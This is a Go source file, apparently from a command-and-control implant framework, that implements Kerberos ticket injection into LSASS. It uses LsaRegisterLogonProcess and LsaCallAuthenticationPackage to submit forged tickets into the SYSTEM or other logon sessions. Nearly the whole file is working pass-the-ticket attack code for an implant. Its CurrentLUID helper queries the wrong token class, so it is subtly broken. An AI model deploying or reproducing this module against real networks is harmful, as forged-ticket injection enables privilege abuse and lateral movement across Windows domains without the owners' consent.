package kerberos

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Kerberos ticket injection via LSASS (LsaCallAuthenticationPackage).

	Windows provides a privileged API to submit Kerberos tickets directly
	into the ticket cache of any logon session:

	  LsaRegisterLogonProcess    — open a privileged LSA handle
	  LsaLookupAuthenticationPackage — resolve the "Kerberos" package ID
	  LsaCallAuthenticationPackage   — submit a ticket
	    with KerbSubmitTicketMessage (message type 21)

	The submitted ticket is accepted by LSASS if it is cryptographically
	valid (encrypted with a key the LSASS Kerberos SSP trusts — i.e., the
	krbtgt key or the session key of the target logon session).

	Logon session selection:
	  - LUID 0x3E7 (999 decimal) = SYSTEM logon session (always present)
	  - LUID 0x3E4 = Network Service
	  - Any interactive user LUID from LsaEnumerateLogonSessions

	After injection, the forged ticket is cached alongside legitimate tickets
	and used transparently by any Kerberos authentication from that session.
	The user doesn't need to log off/on — the ticket is used immediately.
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

const (
	// KerbSubmitTicketMessage — message type for submitting a ticket.
	kerbSubmitTicketMessage = 21
	// KerbQueryTicketCacheMessage — enumerate cached tickets.
	kerbQueryTicketCacheMessage = 1
	// KerbPurgeTicketCacheMessage — clear ticket cache.
	kerbPurgeTicketCacheMessage = 6
)

var (
	modSecur32                  = windows.NewLazySystemDLL("Secur32.dll")
	procLsaRegisterLogonProcess = modSecur32.NewProc("LsaRegisterLogonProcess")
	procLsaConnectUntrusted     = modSecur32.NewProc("LsaConnectUntrusted")
	procLsaLookupAuthPackage    = modSecur32.NewProc("LsaLookupAuthenticationPackage")
	procLsaCallAuthPackage      = modSecur32.NewProc("LsaCallAuthenticationPackage")
	procLsaFreeReturnBuffer     = modSecur32.NewProc("LsaFreeReturnBuffer")
	procLsaDeregisterLogon      = modSecur32.NewProc("LsaDeregisterLogonProcess")
)

// lsaString mirrors the LSA_STRING structure.
type lsaString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *byte
}

// kerbSubmitTicketRequest mirrors KERB_SUBMIT_TKT_REQUEST.
type kerbSubmitTicketRequest struct {
	MessageType    uint32
	LogonId        windows.LUID
	Flags          uint32
	Key            kerbCryptoKey // zero = use current session key
	KerbCredSize   uint32
	KerbCredOffset uint32
	// Followed by the raw ticket bytes.
}

// kerbCryptoKey mirrors KERB_CRYPTO_KEY.
type kerbCryptoKey struct {
	KeyType uint32
	Length  uint32
	Value   uintptr
}

// LSAHandle wraps an LSA handle for ticket operations.
type LSAHandle struct {
	handle    uintptr
	packageID uint32
}

// OpenLSA opens a privileged LSA connection.
// Requires SeDebugPrivilege or TCB privilege for privileged access;
// untrusted access is available to all processes.
func OpenLSA(privileged bool) (*LSAHandle, error) {
	var handle uintptr

	if privileged {
		// LsaRegisterLogonProcess requires SeTcbPrivilege.
		nameStr := "SliverKerberos"
		nameBytes := []byte(nameStr)
		lsaName := lsaString{
			Length:        uint16(len(nameBytes)),
			MaximumLength: uint16(len(nameBytes) + 1),
			Buffer:        &nameBytes[0],
		}
		var secMode uintptr
		r, _, _ := procLsaRegisterLogonProcess.Call(
			uintptr(unsafe.Pointer(&lsaName)),
			uintptr(unsafe.Pointer(&handle)),
			uintptr(unsafe.Pointer(&secMode)),
		)
		if r != 0 {
			// Fall back to untrusted.
			privileged = false
		}
	}

	if !privileged {
		r, _, _ := procLsaConnectUntrusted.Call(
			uintptr(unsafe.Pointer(&handle)),
		)
		if r != 0 {
			return nil, fmt.Errorf("LsaConnectUntrusted NTSTATUS=0x%x", r)
		}
	}

	// Lookup Kerberos package ID.
	pkgName := "Kerberos"
	pkgNameBytes := []byte(pkgName)
	lsaPkg := lsaString{
		Length:        uint16(len(pkgNameBytes)),
		MaximumLength: uint16(len(pkgNameBytes) + 1),
		Buffer:        &pkgNameBytes[0],
	}
	var pkgID uint32
	r, _, _ := procLsaLookupAuthPackage.Call(
		handle,
		uintptr(unsafe.Pointer(&lsaPkg)),
		uintptr(unsafe.Pointer(&pkgID)),
	)
	if r != 0 {
		return nil, fmt.Errorf("LsaLookupAuthenticationPackage NTSTATUS=0x%x", r)
	}

	// {{if .Config.Debug}}
	log.Printf("[kerberos] LSA opened: handle=0x%x KerberosPackageID=%d", handle, pkgID)
	// {{end}}
	return &LSAHandle{handle: handle, packageID: pkgID}, nil
}

// Close releases the LSA handle.
func (h *LSAHandle) Close() {
	if h.handle != 0 {
		procLsaDeregisterLogon.Call(h.handle)
		h.handle = 0
	}
}

// InjectTicket submits a forged Kerberos ticket to the specified logon session.
// targetLUID: use SystemLUID() for SYSTEM session, or 0 for current session.
func (h *LSAHandle) InjectTicket(ticket *ForgedTicket, targetLUID windows.LUID) error {
	if len(ticket.Raw) == 0 {
		return fmt.Errorf("empty ticket")
	}

	// Build KERB_SUBMIT_TKT_REQUEST + ticket bytes in one contiguous buffer.
	reqSize := uint32(unsafe.Sizeof(kerbSubmitTicketRequest{}))
	totalSize := reqSize + uint32(len(ticket.Raw))

	buf := make([]byte, totalSize)
	req := (*kerbSubmitTicketRequest)(unsafe.Pointer(&buf[0]))
	req.MessageType = kerbSubmitTicketMessage
	req.LogonId = targetLUID
	req.Flags = 0
	req.KerbCredSize = uint32(len(ticket.Raw))
	req.KerbCredOffset = reqSize

	// Copy ticket bytes after the header.
	copy(buf[reqSize:], ticket.Raw)

	var returnBuffer uintptr
	var returnBufferLength uint32
	var protocolStatus uint32

	r, _, _ := procLsaCallAuthPackage.Call(
		h.handle,
		uintptr(h.packageID),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&returnBuffer)),
		uintptr(unsafe.Pointer(&returnBufferLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if returnBuffer != 0 {
		procLsaFreeReturnBuffer.Call(returnBuffer)
	}
	if r != 0 {
		return fmt.Errorf("LsaCallAuthenticationPackage NTSTATUS=0x%x protocolStatus=0x%x",
			r, protocolStatus)
	}
	if protocolStatus != 0 {
		return fmt.Errorf("protocol status: 0x%x", protocolStatus)
	}

	// {{if .Config.Debug}}
	log.Printf("[kerberos] ticket injected: %s@%s into LUID=%d:%d",
		ticket.Username, ticket.Domain,
		targetLUID.HighPart, targetLUID.LowPart)
	// {{end}}
	return nil
}

// SystemLUID returns the LUID for the SYSTEM logon session (0x3E7).
func SystemLUID() windows.LUID {
	return windows.LUID{LowPart: 0x3E7, HighPart: 0}
}

// CurrentLUID returns the LUID for the current process's logon session.
func CurrentLUID() (windows.LUID, error) {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_QUERY, &token); err != nil {
		return windows.LUID{}, err
	}
	defer token.Close()

	// TOKEN_SOURCE: SourceName [8]byte + SourceIdentifier LUID.
	type tokenSource struct {
		SourceName       [8]byte
		SourceIdentifier windows.LUID
	}
	var stats tokenSource
	var ret uint32
	const tokenSourceClass = 7 // TOKEN_INFORMATION_CLASS: TokenSource
	if err := windows.GetTokenInformation(token,
		tokenSourceClass,
		(*byte)(unsafe.Pointer(&stats)),
		uint32(unsafe.Sizeof(stats)),
		&ret); err != nil {
		// Fallback to SYSTEM LUID.
		return SystemLUID(), nil
	}
	return stats.SourceIdentifier, nil
}
